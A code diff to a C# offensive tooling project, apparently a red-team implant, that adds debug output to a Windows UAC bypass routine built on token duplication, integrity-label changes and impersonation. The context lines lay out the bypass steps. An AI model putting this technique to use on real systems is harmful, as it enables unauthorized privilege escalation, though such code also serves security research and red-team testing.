@@ -18,6 +18,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         public void BypassUAC(Int32 processId, String command)
         {
+            WriteOutputGood("Running as: "+ WindowsIdentity.GetCurrent().Name);
             GetPrimaryToken((UInt32)processId);
             SetTokenInformation();
             ImpersonateUser();
@@ -34,9 +35,12 @@ namespace WheresMyImplant
             {
                 return;
             }
+            WriteOutputGood("Recieved Handle for: "+ processId);
+            WriteOutputGood("Process Handle: "+ hProcess.ToInt32());
 
             if (Unmanaged.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
             {
+                WriteOutputGood("Primary Token Handle: "+ hExistingToken.ToInt32());
             }
             Unmanaged.CloseHandle(hProcess);
 
@@ -53,6 +57,8 @@ namespace WheresMyImplant
             }
             else
             {
+                WriteOutputGood("Existing Token Handle: "+ hExistingToken.ToInt32());
+                WriteOutputGood("New Token Handle: "+ phNewToken.ToInt32());
             }
         }
 
@@ -66,6 +72,7 @@ namespace WheresMyImplant
             IntPtr pSID = new IntPtr();
             if (Unmanaged.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
             {
+                WriteOutputGood("Initialized SID : "+ pSID.ToInt32());
             }
 
             Structs.SID_AND_ATTRIBUTES sidAndAttributes = new Structs.SID_AND_ATTRIBUTES();
@@ -78,6 +85,7 @@ namespace WheresMyImplant
             
             if (Unmanaged.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
             {
+                WriteOutputGood("Set Token Information : "+ phNewToken.ToInt32());
             }
             else
             {
@@ -87,6 +95,7 @@ namespace WheresMyImplant
             IntPtr luaToken = new IntPtr();
             if (Unmanaged.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
             {
+                Console.WriteLine("Set LUA Token Information : "+ luaToken.ToInt32());
             }
             else
             {
@@ -114,6 +123,7 @@ namespace WheresMyImplant
                 GetError("DuplicateTokenEx: ");
                 return false;
             }
+            Console.WriteLine("Duplicate Token Handle: "+ phNewToken.ToInt32());
             if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
             {
                 GetError("ImpersonateLoggedOnUser: ");
